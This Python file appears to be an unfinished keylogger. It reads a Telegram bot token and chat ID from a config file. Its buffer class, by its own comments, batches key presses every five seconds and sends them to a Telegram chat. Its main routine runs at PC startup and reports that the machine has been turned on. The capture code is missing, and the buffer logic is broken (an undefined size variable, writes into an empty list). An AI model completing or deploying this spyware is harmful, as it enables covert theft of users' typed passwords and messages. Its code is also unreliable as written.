import yaml
import requests
import logging

class Logger:
	def __init__(self,logfile):
		self.logger = logging.getLogger(__name__)
		logging.basicConfig(filename=logfile, encoding="utf-8", level=logging.DEBUG)


	def info(self,message):
		self.logger.info(message)
		return True

	def error(self,message):
		self.logger.error(message)
		return True

	def warning(self,message):
		self.logger.warning(message)
		return True

	def debug(self,message):
		self.logger.debug(message)
		return True

class Bot:
	def __init__(self):
		self.__TOKEN = self.__read_token()
		self.__CHAT_ID = self.__read_chat_id()



	def __read_token(self):
		with open("config.yml") as f:
			try:
				contents = yaml.safe_load(f)
				return contents["BOT_TOKEN"]
			except yaml.YAMLError as e:
				print(e)

	def __read_chat_id(self):
		with open("config.yml") as f:
			try:
				contents = yaml.safe_load(f)
				return contents["CHAT_ID"]
			except yaml.YAMLError as e:
				print(e)

	def send_message(self,message):
		url = f"https://api.telegram.org/bot{self.__TOKEN}/sendMessage?chat_id={self.__CHAT_ID}&text={message}"
		
		response = requests.get(url)
		#print(response.json())
		
		if response.status_code != 200:
			print(f"**A {response.status_code} ERROR OCCURED**: {response.text}")



class Buffer:
	def __init__(self,max_size):
		self.max_size = max_size
		self.buffer = []
		self.end_ptr = 0

	def add_to_buffer(self,data):
		if self.end_ptr != max_size:
			self.buffer[self.end_ptr] = data
			self.end_ptr += 1
		else:
			return

	def flush_buffer(self,bot):
		# detects a key press. every 5 seconds, each key press is flushed into one string and then sent to the telegram webhook
		# during flush, nothing cannnot be added to queue.
		
		total_string = "".join(self.buffer)
		self.buffer = []
		self.end_ptr = 0
		bot.send_message(total_string)
		print("logged keystrokes")
		return


def main():
	# on start of the script (aka on pc startup)
	
	# initialized everything
	bot = Bot()
	buffer = Buffer(300)
	logger = Logger("events.log")

	#logs start message
	bot.send_message("PC has been turned on and logged in successfully.")
	logger.info("pc on")

	
	# starts the logger/keystroke recorder
	

	pass
